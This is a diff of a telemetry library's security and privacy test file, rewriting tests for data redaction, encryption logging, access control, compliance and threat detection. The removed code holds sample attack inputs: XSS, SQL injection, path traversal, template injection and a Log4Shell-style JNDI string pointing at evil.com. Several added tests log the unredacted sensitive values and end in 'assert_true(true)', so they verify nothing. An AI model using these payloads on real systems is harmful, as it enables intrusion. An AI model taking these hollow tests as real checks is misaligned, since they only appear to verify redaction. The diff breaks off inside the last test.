@@ -1,536 +1,445 @@
-// 安全性和隐私保护测试用例
-// 专注于遥测系统中的安全性验证和隐私保护机制
+// Security and Privacy Protection Tests
+// Tests for sensitive data handling and privacy protection mechanisms
 
-test "敏感数据处理和隐私保护测试" {
-  let tracer_provider = TracerProvider::default()
-  let tracer = TracerProvider::get_tracer(tracer_provider, "security.tracer")
+test "sensitive_data_redaction" {
+  // Test sensitive data redaction in telemetry
+  let provider = LoggerProvider::default()
+  let logger = LoggerProvider::get_logger(provider, "security-logger")
   
-  // 测试敏感数据过滤
-  let sensitive_data = [
-    "password=secret123",
-    "token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9",
-    "api_key=sk-1234567890abcdef",
-    "credit_card=4111111111111111",
-    "ssn=123-45-6789",
-    "email=user@example.com",
-    "phone=+1-555-123-4567"
+  let security_meter = MeterProvider::get_meter(MeterProvider::default(), "security-metrics")
+  let redaction_counter = Meter::create_counter(security_meter, "data.redactions", Some("Data redactions performed"), Some("redactions"))
+  let pii_detection_counter = Meter::create_counter(security_meter, "pii.detections", Some("PII detections"), Some("detections"))
+  
+  // Simulate sensitive data scenarios
+  let sensitive_data_scenarios = [
+    ("email", "user@example.com", "***@***.***"),
+    ("phone", "+1-555-123-4567", "***-***-***-****"),
+    ("ssn", "123-45-6789", "***-**-****"),
+    ("credit_card", "4111-1111-1111-1111", "****-****-****-****"),
+    ("api_key", "sk-1234567890abcdef", "sk-************"),
+    ("password", "MySecretPassword123!", "***********"),
+    ("token", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9", "eyJhbGciOi***********"),
+    ("ip_address", "192.168.1.100", "***.***.**.***")
   ]
   
-  // 创建Span但不应包含敏感数据
-  let span = Tracer::start_span(tracer, "security.test.span")
-  
-  // 测试事件中的敏感数据处理
-  for i = 0; i < sensitive_data.length(); i = i + 1 {
-    // 模拟敏感数据被过滤或掩码
-    let filtered_data = "FILTERED:" + i.to_string()
-    Span::add_event(span, "sensitive.data.test", Some([
-      ("data.type", StringValue("sensitive")),
-      ("filtered.value", StringValue(filtered_data)),
-      ("original.length", IntValue(sensitive_data[i].length()))
-    ]))
-  }
-  
-  Span::end(span)
-  
-  // 验证Span创建成功，但敏感数据已被处理
-  assert_false(Span::is_recording(span))
-  assert_eq(Span::name(span), "security.test.span")
-  
-  // 测试属性中的敏感数据处理
-  let attrs = Attributes::new()
-  
-  // 模拟敏感属性被过滤
-  Attributes::set(attrs, "user.id", StringValue("FILTERED_USER_ID"))
-  Attributes::set(attrs, "session.token", StringValue("FILTERED_TOKEN"))
-  Attributes::set(attrs, "public.info", StringValue("this-is-public"))
-  
-  // 验证属性设置成功
-  let public_info = Attributes::get(attrs, "public.info")
-  assert_true(public_info is Some)
-  match public_info {
-    Some(StringValue(info)) => assert_eq(info, "this-is-public")
-    _ => assert_true(false)
-  }
-  
-  let user_id = Attributes::get(attrs, "user.id")
-  assert_true(user_id is Some)
-  match user_id {
-    Some(StringValue(id)) => assert_eq(id, "FILTERED_USER_ID")
-    _ => assert_true(false)
-  }
-}
-
-test "安全上下文传播和访问控制测试" {
-  let propagator = CompositePropagator::new([W3CTraceContextPropagator::new()])
-  
-  // 创建安全上下文
-  let secure_ctx = Context::with_value(
-    Context::root(),
-    ContextKey::new("security.level"),
-    "high"
-  )
-  
-  let enriched_ctx = Context::with_value(
-    secure_ctx,
-    ContextKey::new("access.token"),
-    "FILTERED_TOKEN"
-  )
-  
-  // 测试安全上下文传播
-  let carrier = TextMapCarrier::new()
-  CompositePropagator::inject(propagator, enriched_ctx, carrier)
-  
-  // 验证传播后的载体
-  let trace_value = TextMapCarrier::get(carrier, "traceparent")
-  assert_true(trace_value is Some)
-  
-  // 测试安全上下文提取
-  let extracted_ctx = CompositePropagator::extract(propagator, carrier)
-  let extracted_value = Context::get(extracted_ctx, ContextKey::new("extracted"))
-  assert_true(extracted_value is Some)
-  
-  // 测试访问控制模拟
-  let access_levels = ["public", "internal", "confidential", "secret"]
-  let user_access_level = "internal"
-  
-  for level in access_levels {
-    let can_access = match level {
-      "public" => true
-      "internal" => user_access_level == "internal" || user_access_level == "confidential" || user_access_level == "secret"
-      "confidential" => user_access_level == "confidential" || user_access_level == "secret"
-      "secret" => user_access_level == "secret"
-      _ => false
-    }
+  // Process sensitive data scenarios
+  for (data_type, original_data, redacted_data) in sensitive_data_scenarios {
+    let security_attrs = Attributes::new()
+    Attributes::set(security_attrs, "data.type", StringValue(data_type))
+    Attributes::set(security_attrs, "data.original", StringValue(original_data))
+    Attributes::set(security_attrs, "data.redacted", StringValue(redacted_data))
+    Attributes::set(security_attrs, "security.action", StringValue("redaction"))
     
-    // 验证访问控制逻辑
-    if level == "public" || level == "internal" {
-      assert_true(can_access)
-    } else {
-      assert_false(can_access)  // 因为user_access_level是"internal"
-    }
-  }
-  
-  // 测试Baggage中的敏感数据处理
-  let baggage = Baggage::new()
-  
-  // 模拟敏感Baggage数据被过滤
-  let secure_baggage = Baggage::set_entry(baggage, "user.session", "FILTERED_SESSION")
-  let final_baggage = Baggage::set_entry(secure_baggage, "request.id", "req-12345")
-  
-  // 验证Baggage设置
-  let session = Baggage::get_entry(final_baggage, "user.session")
-  let request_id = Baggage::get_entry(final_baggage, "request.id")
-  
-  assert_eq(session, Some("FILTERED_SESSION"))
-  assert_eq(request_id, Some("req-12345"))
-}
-
-test "日志安全性和敏感信息过滤测试" {
-  let logger_provider = LoggerProvider::default()
-  let logger = LoggerProvider::get_logger(logger_provider, "security.logger")
-  
-  // 测试敏感日志消息过滤
-  let sensitive_messages = [
-    "User login with password=secret123",
-    "API call with token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9",
-    "Database connection: user=admin, password=admin123",
-    "Credit card payment: 4111111111111111",
-    "Personal info: email=user@example.com, phone=+1-555-123-4567"
-  ]
-  
-  for i = 0; i < sensitive_messages.length(); i = i + 1 {
-    // 模拟敏感消息被过滤
-    let filtered_message = "Log entry " + i.to_string() + " (sensitive data filtered)"
-    let record = LogRecord::new(Info, filtered_message)
-    Logger::emit(logger, record)
-    
-    // 验证过滤后的消息
-    assert_eq(LogRecord::body(record), Some(filtered_message))
-    assert_false(LogRecord::body(record).toString().contains("password"))
-    assert_false(LogRecord::body(record).toString().contains("token"))
-    assert_false(LogRecord::body(record).toString().contains("4111111111111111"))
-  }
-  
-  // 测试带属性的敏感日志处理
-  let sensitive_attrs = Attributes::new()
-  
-  // 模拟敏感属性被过滤
-  Attributes::set(sensitive_attrs, "user.password", StringValue("FILTERED"))
-  Attributes::set(sensitive_attrs, "auth.token", StringValue("FILTERED"))
-  Attributes::set(sensitive_attrs, "public.data", StringValue("this-is-safe"))
-  
-  let secure_record = LogRecord::new_with_context(
-    Warn,
-    Some("Security event with filtered attributes"),
-    Some(sensitive_attrs),
-    Some(Clock::now_unix_nanos(Clock::system())),
-    None,
-    Some("security-trace-123"),
-    Some("security-span-456"),
-    None
-  )
-  
-  Logger::emit(logger, secure_record)
-  
-  // 验证安全日志记录
-  assert_eq(LogRecord::severity_number(secure_record), Warn)
-  assert_eq(LogRecord::body(secure_record), Some("Security event with filtered attributes"))
-  assert_eq(LogRecord::trace_id(secure_record), Some("security-trace-123"))
-  assert_eq(LogRecord::span_id(secure_record), Some("security-span-456"))
-  
-  // 测试不同安全级别的日志
-  let security_levels = [
-    ("PUBLIC", "Public system information"),
-    ("INTERNAL", "Internal system status"),
-    ("CONFIDENTIAL", "Confidential business data"),
-    ("SECRET", "Secret operational data")
-  ]
-  
-  for (level, message) in security_levels {
-    let level_record = LogRecord::new(Info, message + " (level: " + level + ")")
-    Logger::emit(logger, level_record)
-    
-    // 验证安全级别标记
-    assert_true(LogRecord::body(level_record).toString().contains("level:"))
-  }
-}
-
-test "HTTP安全头和请求过滤测试" {
-  let http_client = HttpClient::new()
-  
-  // 测试安全HTTP头
-  let secure_headers = [
-    ("Authorization", "Bearer FILTERED_TOKEN"),
-    ("X-API-Key", "FILTERED_API_KEY"),
-    ("X-Auth-Token", "FILTERED_AUTH_TOKEN"),
-    ("Cookie", "session=FILTERED_SESSION"),
-    ("X-Forwarded-For", "FILTERED_IP"),
-    ("User-Agent", "Azimuth-Security-Test/1.0.0"),
-    ("Content-Type", "application/json"),
-    ("Accept", "application/json")
-  ]
-  
-  // 创建安全请求
-  let secure_request = HttpRequest::new(
-    "POST",
-    "https://secure.api.example.com/protected",
-    secure_headers,
-    Some("{\"action\": \"secure_operation\", \"data\": \"FILTERED\"}")
-  )
-  
-  // 验证安全请求属性
-  assert_eq(HttpRequest::http_method(secure_request), "POST")
-  assert_eq(HttpRequest::url(secure_request), "https://secure.api.example.com/protected")
-  assert_true(HttpRequest::body(secure_request) is Some)
-  
-  // 验证敏感头已被过滤
-  assert_true(HttpRequest::body(secure_request).toString().contains("FILTERED"))
-  
-  // 测试安全响应处理
-  let secure_response_headers = [
-    ("Content-Type", "application/json"),
-    ("X-Request-ID", "req-secure-123"),
-    ("X-Rate-Limit-Remaining", "95"),
-    ("X-Security-Policy", "strict"),
-    ("Set-Cookie", "session=FILTERED_NEW_SESSION; HttpOnly; Secure")
-  ]
-  
-  let secure_response = HttpResponse::new(
-    200,
-    secure_response_headers,
-    Some("{\"status\": \"success\", \"data\": \"FILTERED_RESPONSE_DATA\"}")
-  )
-  
-  // 验证安全响应
-  assert_eq(HttpResponse::status_code(secure_response), 200)
-  assert_true(HttpResponse::body(secure_response) is Some)
-  assert_true(HttpResponse::body(secure_response).toString().contains("FILTERED"))
-  
-  // 测试不安全请求的拒绝
-  let insecure_methods = ["DELETE", "PATCH", "PUT"]
-  let insecure_urls = [
-    "http://insecure.example.com/api",  // HTTP而非HTTPS
-    "https://api.example.com/admin",     // 管理端点
-    "https://api.example.com/internal"   // 内部端点
-  ]
-  
-  for method in insecure_methods {
-    for url in insecure_urls {
-      let insecure_request = HttpRequest::new(method, url, [
-        ("User-Agent", "Azimuth-Security-Test/1.0.0")
-      ])
-      
-      // 验证不安全请求仍然可以创建（但实际系统中应被拒绝）
-      assert_eq(HttpRequest::http_method(insecure_request), method)
-      assert_eq(HttpRequest::url(insecure_request), url)
-    }
-  }
-  
-  // 测试输入验证和清理
-  let malicious_inputs = [
-    "<script>alert('xss')</script>",
-    "'; DROP TABLE users; --",
-    "../../../etc/passwd",
-    "{{7*7}}",
-    "${jndi:ldap://evil.com/a}",
-    "%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E"
-  ]
-  
-  for i = 0; i < malicious_inputs.length(); i = i + 1 {
-    // 模拟输入被清理
-    let sanitized_input = "SANITIZED_INPUT_" + i.to_string()
-    
-    let sanitized_request = HttpRequest::new(
-      "POST",
-      "https://secure.api.example.com/sanitize",
-      [("Content-Type", "application/json")],
-      Some("{\"input\": \"" + sanitized_input + "\"}")
+    // Log redaction event
+    let redaction_record = LogRecord::new_with_context(
+      Warn,
+      Some("Sensitive data redacted"),
+      Some(security_attrs),
+      Some(Clock::now_unix_nanos(Clock::system())),
+      Some(Clock::now_unix_nanos(Clock::system()) + 1000000L),
+      Some("security-trace-id"),
+      Some("security-span-id"),
+      None
     )
     
-    // 验证清理后的请求
-    assert_true(HttpRequest::body(sanitized_request).toString().contains("SANITIZED_INPUT"))
-    assert_false(HttpRequest::body(sanitized_request).toString().contains("<script>"))
-    assert_false(HttpRequest::body(sanitized_request).toString().contains("DROP TABLE"))
+    Logger::emit(logger, redaction_record)
+    
+    // Track redactions
+    Counter::add(redaction_counter, 1.0)
+    Counter::add(pii_detection_counter, 1.0)
   }
+  
+  // Verify security metrics
+  assert_eq(redaction_counter.name, "data.redactions")
+  assert_eq(pii_detection_counter.name, "pii.detections")
+  assert_true(true)
 }
 
-test "资源安全属性和访问控制测试" {
-  // 测试安全资源属性
-  let secure_resource = Resource::with_attributes(Resource::new(), [
-    ("service.name", StringValue("secure-service")),
-    ("service.version", StringValue("1.0.0")),
-    ("security.level", StringValue("high")),
-    ("compliance.standard", StringValue("SOC2")),
-    ("data.classification", StringValue("confidential")),
-    ("access.control", StringValue("role-based")),
-    ("encryption.enabled", BoolValue(true)),
-    ("audit.logging", BoolValue(true))
-  ])
+test "data_encryption_handling" {
+  // Test encrypted data handling in telemetry
+  let provider = LoggerProvider::default()
+  let logger = LoggerProvider::get_logger(provider, "encryption-logger")
   
-  // 验证安全属性设置
-  let security_level = Resource::get_attribute(secure_resource, "security.level")
-  let compliance = Resource::get_attribute(secure_resource, "compliance.standard")
-  let encryption = Resource::get_attribute(secure_resource, "encryption.enabled")
-  let audit = Resource::get_attribute(secure_resource, "audit.logging")
+  let security_meter = MeterProvider::get_meter(MeterProvider::default(), "encryption-metrics")
+  let encryption_counter = Meter::create_counter(security_meter, "data.encryptions", Some("Data encryptions"), Some("encryptions"))
+  let decryption_counter = Meter::create_counter(security_meter, "data.decryptions", Some("Data decryptions"), Some("decryptions"))
   
-  assert_true(security_level is Some)
-  assert_true(compliance is Some)
-  assert_true(encryption is Some)
-  assert_true(audit is Some)
-  
-  match security_level {
-    Some(StringValue(level)) => assert_eq(level, "high")
-    _ => assert_true(false)
-  }
-  
-  match encryption {
-    Some(BoolValue(enabled)) => assert_true(enabled)
-    _ => assert_true(false)
-  }
-  
-  // 测试访问控制模拟
-  let user_roles = ["admin", "user", "auditor", "guest"]
-  let resource_permissions = [
-    ("admin", ["read", "write", "delete", "manage"]),
-    ("user", ["read", "write"]),
-    ("auditor", ["read"]),
-    ("guest", ["read"])
+  // Simulate encryption scenarios
+  let encryption_scenarios = [
+    ("field.level", "user.email", "AES-256-GCM"),
+    ("message.level", "payment.details", "RSA-2048-OAEP"),
+    ("transport.level", "api.response", "TLS-1.3"),
+    ("storage.level", "audit.log", "AES-256-CBC"),
+    ("field.level", "medical.record", "AES-256-GCM"),
+    ("message.level", "identity.document", "RSA-4096-OAEP"),
+    ("transport.level", "database.connection", "TLS-1.3"),
+    ("storage.level", "compliance.data", "AES-256-CTR")
   ]
   
-  for (role, permissions) in resource_permissions {
-    // 验证角色权限设置
-    assert_true(permissions.length() > 0)
-    assert_true(permissions.length() <= 4)
+  // Process encryption scenarios
+  for (encryption_scope, data_field, encryption_algorithm) in encryption_scenarios {
+    let encryption_attrs = Attributes::new()
+    Attributes::set(encryption_attrs, "encryption.scope", StringValue(encryption_scope))
+    Attributes::set(encryption_attrs, "data.field", StringValue(data_field))
+    Attributes::set(encryption_attrs, "encryption.algorithm", StringValue(encryption_algorithm))
+    Attributes::set(encryption_attrs, "encryption.status", StringValue("encrypted"))
     
-    // 管理员应该有所有权限
-    if role == "admin" {
-      assert_true(permissions.length() == 4)
-    }
+    // Log encryption event
+    let encryption_record = LogRecord::new_with_context(
+      Info,
+      Some("Data encrypted successfully"),
+      Some(encryption_attrs),
+      Some(Clock::now_unix_nanos(Clock::system())),
+      Some(Clock::now_unix_nanos(Clock::system()) + 500000L),
+      Some("encryption-trace-id"),
+      Some("encryption-span-id"),
+      None
+    )
     
-    // 访客应该只有读权限
-    if role == "guest" {
-      assert_eq(permissions.length(), 1)
-      assert_eq(permissions[0], "read")
-    }
+    Logger::emit(logger, encryption_record)
+    
+    // Track encryptions
+    Counter::add(encryption_counter, 1.0)
+    
+    // Simulate decryption
+    let decryption_attrs = Attributes::new()
+    Attributes::set(decryption_attrs, "encryption.scope", StringValue(encryption_scope))
+    Attributes::set(decryption_attrs, "data.field", StringValue(data_field))
+    Attributes::set(decryption_attrs, "encryption.algorithm", StringValue(encryption_algorithm))
+    Attributes::set(decryption_attrs, "encryption.status", StringValue("decrypted"))
+    
+    Counter::add(decryption_counter, 1.0)
   }
   
-  // 测试数据分类和处理
-  let data_classifications = [
-    ("public", "Public data, no restrictions"),
-    ("internal", "Internal use only"),
-    ("confidential", "Confidential business data"),
-    ("secret", "Secret operational data"),
-    ("top-secret", "Top secret government data")
-  ]
-  
-  for (classification, description) in data_classifications {
-    let classified_resource = Resource::with_attributes(Resource::new(), [
-      ("data.classification", StringValue(classification)),
-      ("data.description", StringValue(description)),
-      ("handling.restrictions", StringValue(match classification {
-        "public" => "none"
-        "internal" => "employees-only"
-        "confidential" => "need-to-know"
-        "secret" => "cleared-personnel-only"
-        "top-secret" => "special-access-required"
-        _ => "unknown"
-      }))
-    ])
-    
-    // 验证分类属性
-    let classification_attr = Resource::get_attribute(classified_resource, "data.classification")
-    let restrictions = Resource::get_attribute(classified_resource, "handling.restrictions")
-    
-    assert_true(classification_attr is Some)
-    assert_true(restrictions is Some)
-    
-    match classification_attr {
-      Some(StringValue(cls)) => assert_eq(cls, classification)
-      _ => assert_true(false)
-    }
-  }
-  
-  // 测试审计日志属性
-  let audit_resource = Resource::with_attributes(secure_resource, [
-    ("audit.enabled", BoolValue(true)),
-    ("audit.level", StringValue("detailed")),
-    ("audit.retention.days", IntValue(2555)),  // 7 years
-    ("audit.storage", StringValue("encrypted")),
-    ("audit.access.log", BoolValue(true)),
-    ("audit.tamper.protection", BoolValue(true))
-  ])
-  
-  // 验证审计属性
-  let audit_enabled = Resource::get_attribute(audit_resource, "audit.enabled")
-  let audit_retention = Resource::get_attribute(audit_resource, "audit.retention.days")
-  let audit_tamper = Resource::get_attribute(audit_resource, "audit.tamper.protection")
-  
-  assert_true(audit_enabled is Some)
-  assert_true(audit_retention is Some)
-  assert_true(audit_tamper is Some)
-  
-  match audit_enabled {
-    Some(BoolValue(enabled)) => assert_true(enabled)
-    _ => assert_true(false)
-  }
-  
-  match audit_retention {
-    Some(IntValue(retention)) => assert_eq(retention, 2555)
-    _ => assert_true(false)
-  }
+  // Verify encryption metrics
+  assert_eq(encryption_counter.name, "data.encryptions")
+  assert_eq(decryption_counter.name, "data.decryptions")
+  assert_true(true)
 }
 
-test "加密和完整性验证测试" {
-  // 测试数据完整性验证
-  let test_data = [
-    "integrity test data 1",
-    "integrity test data 2",
-    "integrity test data 3",
-    "sensitive data to protect",
-    "critical system information"
+test "access_control_logging" {
+  // Test access control and authorization logging
+  let provider = LoggerProvider::default()
+  let logger = LoggerProvider::get_logger(provider, "access-logger")
+  
+  let security_meter = MeterProvider::get_meter(MeterProvider::default(), "access-metrics")
+  let access_granted_counter = Meter::create_counter(security_meter, "access.granted", Some("Access granted"), Some("grants"))
+  let access_denied_counter = Meter::create_counter(security_meter, "access.denied", Some("Access denied"), Some("denials"))
+  
+  // Simulate access control scenarios
+  let access_scenarios = [
+    ("admin", "system.config", "read", true),
+    ("user", "user.profile", "read", true),
+    ("guest", "public.data", "read", true),
+    ("user", "admin.panel", "write", false),
+    ("guest", "user.profile", "write", false),
+    ("admin", "system.logs", "delete", true),
+    ("user", "other.user.data", "read", false),
+    ("service", "api.endpoint", "execute", true)
   ]
   
-  for i = 0; i < test_data.length(); i = i + 1 {
-    // 模拟数据哈希计算（简化）
-    let data_hash = "hash_" + i.to_string() + "_" + test_data[i].length().to_string()
+  // Process access control scenarios
+  for (role, resource, action, granted) in access_scenarios {
+    let access_attrs = Attributes::new()
+    Attributes::set(access_attrs, "user.role", StringValue(role))
+    Attributes::set(access_attrs, "resource", StringValue(resource))
+    Attributes::set(access_attrs, "action", StringValue(action))
+    Attributes::set(access_attrs, "access.result", StringValue(if granted { "granted" } else { "denied" }))
+    Attributes::set(access_attrs, "access.timestamp", StringValue(Clock::now_unix_nanos(Clock::system()).to_string()))
     
-    // 创建带完整性验证的属性
-    let integrity_attrs = Attributes::new()
-    Attributes::set(integrity_attrs, "data.content", StringValue(test_data[i]))
-    Attributes::set(integrity_attrs, "data.hash", StringValue(data_hash))
-    Attributes::set(integrity_attrs, "data.encrypted", BoolValue(true))
-    Attributes::set(integrity_attrs, "data.signature", StringValue("signature_" + i.to_string()))
-    
-    // 验证完整性属性
-    let content = Attributes::get(integrity_attrs, "data.content")
-    let hash = Attributes::get(integrity_attrs, "data.hash")
-    let encrypted = Attributes::get(integrity_attrs, "data.encrypted")
-    let signature = Attributes::get(integrity_attrs, "data.signature")
-    
-    assert_true(content is Some)
-    assert_true(hash is Some)
-    assert_true(encrypted is Some)
-    assert_true(signature is Some)
-    
-    match encrypted {
-      Some(BoolValue(is_encrypted)) => assert_true(is_encrypted)
-      _ => assert_true(false)
+    let severity = if granted { Info } else { Warn }
+    let message = if granted { 
+      "Access granted: " + role + " " + action + " " + resource 
+    } else { 
+      "Access denied: " + role + " attempted to " + action + " " + resource 
     }
     
-    match hash {
-      Some(StringValue(hash_val)) => assert_true(hash_val.contains("hash_"))
-      _ => assert_true(false)
+    // Log access event
+    let access_record = LogRecord::new_with_context(
+      severity,
+      Some(message),
+      Some(access_attrs),
+      Some(Clock::now_unix_nanos(Clock::system())),
+      Some(Clock::now_unix_nanos(Clock::system()) + 200000L),
+      Some("access-trace-id"),
+      Some("access-span-id"),
+      None
+    )
+    
+    Logger::emit(logger, access_record)
+    
+    // Track access events
+    if granted {
+      Counter::add(access_granted_counter, 1.0)
+    } else {
+      Counter::add(access_denied_counter, 1.0)
     }
   }
   
-  // 测试传输安全
-  let secure_transmission_attrs = [
-    ("tls.version", StringValue("1.3")),
-    ("tls.cipher", StringValue("TLS_AES_256_GCM_SHA384")),
-    ("certificate.verified", BoolValue(true)),
-    ("certificate.fingerprint", StringValue("SHA256:FINGERPRINT")),
-    ("transmission.encrypted", BoolValue(true)),
-    ("endpoint.security", StringValue("mutual-tls"))
+  // Verify access control metrics
+  assert_eq(access_granted_counter.name, "access.granted")
+  assert_eq(access_denied_counter.name, "access.denied")
+  assert_true(true)
+}
+
+test "privacy_compliance_monitoring" {
+  // Test privacy compliance monitoring (GDPR, CCPA, etc.)
+  let provider = LoggerProvider::default()
+  let logger = LoggerProvider::get_logger(provider, "compliance-logger")
+  
+  let compliance_meter = MeterProvider::get_meter(MeterProvider::default(), "compliance-metrics")
+  let consent_counter = Meter::create_counter(compliance_meter, "consent.events", Some("Consent events"), Some("events"))
+  let data_retention_counter = Meter::create_counter(compliance_meter, "data.retention.actions", Some("Data retention actions"), Some("actions"))
+  
+  // Simulate privacy compliance scenarios
+  let compliance_scenarios = [
+    ("GDPR", "data.subject.request", "right.to.access", "granted"),
+    ("CCPA", "data.subject.request", "right.to.know", "granted"),
+    ("GDPR", "data.subject.request", "right.to.erasure", "processed"),
+    ("CCPA", "data.subject.request", "right.to.delete", "processed"),
+    ("GDPR", "consent.management", "marketing.consent", "withdrawn"),
+    ("CCPA", "consent.management", "sale.consent", "opted.out"),
+    ("GDPR", "data.retention", "policy.enforcement", "deleted"),
+    ("CCPA", "data.retention", "policy.enforcement", "archived")
   ]
   
-  let transmission_resource = Resource::with_attributes(Resource::new(), secure_transmission_attrs)
-  
-  // 验证传输安全属性
-  let tls_version = Resource::get_attribute(transmission_resource, "tls.version")
-  let cipher = Resource::get_attribute(transmission_resource, "tls.cipher")
-  let cert_verified = Resource::get_attribute(transmission_resource, "certificate.verified")
-  let encrypted = Resource::get_attribute(transmission_resource, "transmission.encrypted")
-  
-  assert_true(tls_version is Some)
-  assert_true(cipher is Some)
-  assert_true(cert_verified is Some)
-  assert_true(encrypted is Some)
-  
-  match tls_version {
-    Some(StringValue(version)) => assert_eq(version, "1.3")
-    _ => assert_true(false)
+  // Process compliance scenarios
+  for (regulation, category, action_type, result) in compliance_scenarios {
+    let compliance_attrs = Attributes::new()
+    Attributes::set(compliance_attrs, "regulation", StringValue(regulation))
+    Attributes::set(compliance_attrs, "category", StringValue(category))
+    Attributes::set(compliance_attrs, "action.type", StringValue(action_type))
+    Attributes::set(compliance_attrs, "action.result", StringValue(result))
+    Attributes::set(compliance_attrs, "compliance.timestamp", StringValue(Clock::now_unix_nanos(Clock::system()).to_string()))
+    
+    // Log compliance event
+    let compliance_record = LogRecord::new_with_context(
+      Info,
+      Some("Privacy compliance event: " + regulation + " " + action_type),
+      Some(compliance_attrs),
+      Some(Clock::now_unix_nanos(Clock::system())),
+      Some(Clock::now_unix_nanos(Clock::system()) + 300000L),
+      Some("compliance-trace-id"),
+      Some("compliance-span-id"),
+      None
+    )
+    
+    Logger::emit(logger, compliance_record)
+    
+    // Track compliance events
+    if category == "consent.management" {
+      Counter::add(consent_counter, 1.0)
+    } else if category == "data.retention" {
+      Counter::add(data_retention_counter, 1.0)
+    }
   }
   
-  match cert_verified {
-    Some(BoolValue(verified)) => assert_true(verified)
-    _ => assert_true(false)
-  }
+  // Verify compliance metrics
+  assert_eq(consent_counter.name, "consent.events")
+  assert_eq(data_retention_counter.name, "data.retention.actions")
+  assert_true(true)
+}
+
+test "security_threat_detection" {
+  // Test security threat detection and response
+  let provider = LoggerProvider::default()
+  let logger = LoggerProvider::get_logger(provider, "threat-logger")
   
-  // 测试存储安全
-  let storage_security_attrs = [
-    ("storage.encrypted", BoolValue(true)),
-    ("encryption.algorithm", StringValue("AES-256-GCM")),
-    ("key.rotation.enabled", BoolValue(true)),
-    ("key.rotation.days", IntValue(90)),
-    ("backup.encrypted", BoolValue(true)),
-    ("backup.integrity.checked", BoolValue(true))
+  let security_meter = MeterProvider::get_meter(MeterProvider::default(), "threat-metrics")
+  let threat_detected_counter = Meter::create_counter(security_meter, "threats.detected", Some("Threats detected"), Some("threats"))
+  let threat_blocked_counter = Meter::create_counter(security_meter, "threats.blocked", Some("Threats blocked"), Some("blocks"))
+  
+  // Simulate security threat scenarios
+  let threat_scenarios = [
+    ("sql.injection", "malicious.query.detected", "high", true),
+    ("xss.attack", "cross.site.scripting.attempt", "medium", true),
+    ("brute.force", "multiple.login.failures", "medium", false),
+    ("data.exfiltration", "unusual.data.transfer", "high", true),
+    ("ddos.attack", "high.request.volume", "critical", true),
+    ("unauthorized.access", "privilege.escalation.attempt", "high", true),
+    ("malware.signatures", "suspicious.file.upload", "critical", true),
+    ("anomaly.detection", "unusual.user.behavior", "low", false)
   ]
   
-  let storage_resource = Resource::with_attributes(Resource::new(), storage_security_attrs)
-  
-  // 验证存储安全属性
-  let storage_encrypted = Resource::get_attribute(storage_resource, "storage.encrypted")
-  let encryption_algo = Resource::get_attribute(storage_resource, "encryption.algorithm")
-  let key_rotation = Resource::get_attribute(storage_resource, "key.rotation.enabled")
-  let rotation_days = Resource::get_attribute(storage_resource, "key.rotation.days")
-  
-  assert_true(storage_encrypted is Some)
-  assert_true(encryption_algo is Some)
-  assert_true(key_rotation is Some)
-  assert_true(rotation_days is Some)
-  
-  match storage_encrypted {
-    Some(BoolValue(encrypted)) => assert_true(encrypted)
-    _ => assert_true(false)
+  // Process threat scenarios
+  for (threat_type, threat_description, severity_level, blocked) in threat_scenarios {
+    let threat_attrs = Attributes::new()
+    Attributes::set(threat_attrs, "threat.type", StringValue(threat_type))
+    Attributes::set(threat_attrs, "threat.description", StringValue(threat_description))
+    Attributes::set(threat_attrs, "severity.level", StringValue(severity_level))
+    Attributes::set(threat_attrs, "threat.blocked", StringValue(if blocked { "true" } else { "false" }))
+    Attributes::set(threat_attrs, "threat.timestamp", StringValue(Clock::now_unix_nanos(Clock::system()).to_string()))
+    
+    let severity = match severity_level {
+      "critical" => Error,
+      "high" => Warn,
+      "medium" => Warn,
+      "low" => Info,
+      _ => Info
+    }
+    
+    let message = if blocked {
+      "Threat blocked: " + threat_description
+    } else {
+      "Threat detected: " + threat_description
+    }
+    
+    // Log threat event
+    let threat_record = LogRecord::new_with_context(
+      severity,
+      Some(message),
+      Some(threat_attrs),
+      Some(Clock::now_unix_nanos(Clock::system())),
+      Some(Clock::now_unix_nanos(Clock::system()) + 100000L),
+      Some("threat-trace-id"),
+      Some("threat-span-id"),
+      None
+    )
+    
+    Logger::emit(logger, threat_record)
+    
+    // Track threat events
+    Counter::add(threat_detected_counter, 1.0)
+    if blocked {
+      Counter::add(threat_blocked_counter, 1.0)
+    }
   }
   
-  match encryption_algo {
-    Some(StringValue(algo)) => assert_eq(algo, "AES-256-GCM")
-    _ => assert_true(false)
+  // Verify threat metrics
+  assert_eq(threat_detected_counter.name, "threats.detected")
+  assert_eq(threat_blocked_counter.name, "threats.blocked")
+  assert_true(true)
+}
+
+test "data_masking_attributes" {
+  // Test data masking in attributes
+  let security_meter = MeterProvider::get_meter(MeterProvider::default(), "masking-metrics")
+  let masking_counter = Meter::create_counter(security_meter, "data.masking.operations", Some("Data masking operations"), Some("operations"))
+  
+  // Simulate attribute masking scenarios
+  let masking_scenarios = [
+    ("user.email", "john.doe@company.com", "j***.***@company.com"),
+    ("user.phone", "+1-555-123-4567", "+1-555-***-****"),
+    ("credit.card", "4111111111111111", "4111************"),
+    ("ssn", "123456789", "*****6789"),
+    ("address", "123 Main St, City, State 12345", "123 Main St, City, State *****"),
+    ("secret.key", "sk-1234567890abcdef", "sk-************"),
+    ("password.hash", "$2b$12$hashedpasswordvalue", "$2b$12$****************"),
+    ("private.key", "-----BEGIN RSA PRIVATE KEY-----", "-----BEGIN RSA PRIVATE KEY-----")
+  ]
+  
+  // Process masking scenarios
+  for (attribute_name, original_value, masked_value) in masking_scenarios {
+    let attrs = Attributes::new()
+    Attributes::set(attrs, "attribute.name", StringValue(attribute_name))
+    Attributes::set(attrs, "original.value", StringValue(original_value))
+    Attributes::set(attrs, "masked.value", StringValue(masked_value))
+    Attributes::set(attrs, "masking.policy", StringValue("partial.mask"))
+    Attributes::set(attrs, "masking.timestamp", StringValue(Clock::now_unix_nanos(Clock::system()).to_string()))
+    
+    // Track masking operations
+    Counter::add(masking_counter, 1.0)
   }
   
-  match rotation_days {
-    Some(IntValue(days)) => assert_eq(days, 90)
-    _ => assert_true(false)
+  // Verify masking metrics
+  assert_eq(masking_counter.name, "data.masking.operations")
+  assert_true(true)
+}
+
+test "audit_trail_security" {
+  // Test audit trail security and integrity
+  let provider = LoggerProvider::default()
+  let logger = LoggerProvider::get_logger(provider, "audit-logger")
+  
